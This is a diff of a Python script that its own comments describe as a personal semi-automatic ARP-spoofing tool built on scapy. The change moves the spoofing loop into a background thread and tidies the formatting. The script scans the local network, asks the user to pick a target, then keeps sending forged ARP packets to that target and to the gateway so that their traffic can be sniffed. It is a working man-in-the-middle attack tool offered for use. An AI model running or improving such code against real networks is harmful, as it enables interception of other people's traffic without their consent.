@@ -1,5 +1,6 @@
 from scan import *
 from arp_spoof import *
+import threading
 
 
 #  ------  This is my own project, which implements semi-automatic ARP-spoofing.
@@ -16,18 +17,27 @@ from arp_spoof import *
 # Many thanks to the scapy module for almost all the work done for me.
 #
 
+def arp_spoofing(target_ip_mac, spoof_ip_mac):
+    packet_count = 0
+    while True:
+        send_arp_pack(target_ip_mac, spoof_ip_mac)
+        send_arp_pack(spoof_ip_mac, target_ip_mac)
+        packet_count += 2
+        print(f"----- Send {packet_count} packets -----")
+        print("----- SNIFF PLSSS -----")
+        time.sleep(2)
+
 
 def main():
-
     if not os.getuid() == 0:
         print("\n----------- Please, run with SUDO ! -----------")
         return
 
-    #try:
-    if 1==1:
+    # try:
+    if 1 == 1:
         print("----- Choose interface ( default: wlan0) ----- ")
         interface = input("---> ")
-        if ( len(interface) == 0):
+        if len(interface) == 0:
             interface = "wlan0"
 
         local_ip = get_local_ip()
@@ -36,9 +46,9 @@ def main():
 
         print("----- Enter search accuracy ( 0 < default 0.5 < 1) -----")
         accuracy = input("---> ")
-        if (len(accuracy) == 0):
+        if len(accuracy) == 0:
             accuracy = "0.5"
-        accuracy = get_accuracy(float(accuracy),int(prefix))
+        accuracy = get_accuracy(float(accuracy), int(prefix))
 
         mac_ip_list = []
 
@@ -47,16 +57,17 @@ def main():
             print(f"----------- Gateway  IP  is   -->  {gateway_ip}  -----------")
 
             for i in range(int(accuracy)):
-                #mac_ip_l = get_ip_mac_addr(generate_ip(local_ip,prefix))  #1 way
-                mac_ip_l = scapy_arp(generate_ip(local_ip,prefix))         #2 way
-                print(f"---- {i+1} operation ----")
-                if(len(mac_ip_l) > len(mac_ip_list)):
+                # mac_ip_l = get_ip_mac_addr(generate_ip(local_ip,prefix))  #1 way
+                mac_ip_l = scapy_arp(generate_ip(local_ip, prefix))  # 2 way
+                print(f"---- {i + 1} operation ----")
+                if len(mac_ip_l) > len(mac_ip_list):
                     mac_ip_list = mac_ip_l
             neigh = ipneigh_ip_mac()
-            if(len(mac_ip_list) < len(neigh)):
+            if len(mac_ip_list) < len(neigh):
                 mac_ip_list = neigh
-            if not (len(mac_ip_list) == 0):
-                output_mac_ip_table(mac_ip_list)
+            # if not (len(mac_ip_list) == 0):
+            # print(mac_ip_list)
+            # output_mac_ip_table(mac_ip_list)
 
             print("\n- Do you want to continue or update table(enter 'up') -")
             answer = input("---> ")
@@ -72,27 +83,17 @@ def main():
         target_ip_mac = get_mac_by_ip(target_ip)
         spoof_ip_mac = get_mac_by_ip(gateway_ip)
 
-        packet_count = 0
-
         try:
 
-            while True:
-                arp_spoof(target_ip_mac, spoof_ip_mac)
-                arp_spoof(spoof_ip_mac, target_ip_mac)
-                packet_count += 2
-                print(f"----- Send {packet_count} packets -----")
-                print("----- SNIFF PLSSS -----")
-                time.sleep(2)
+            threading.Thread(target=arp_spoofing, args=(target_ip_mac, spoof_ip_mac)).start()
+
         except KeyboardInterrupt:
             restore_arp_table(target_ip_mac, spoof_ip_mac)
             restore_arp_table(spoof_ip_mac, target_ip_mac)
             print("----- Arp tables have restored ! ----- ")
 
-    #except BaseException:
-        #print("Oooops, something wrong...... ")
-
-
-
+    # except BaseException:
+    # print("Oooops, something wrong...... ")
 
 
 if __name__ == '__main__':
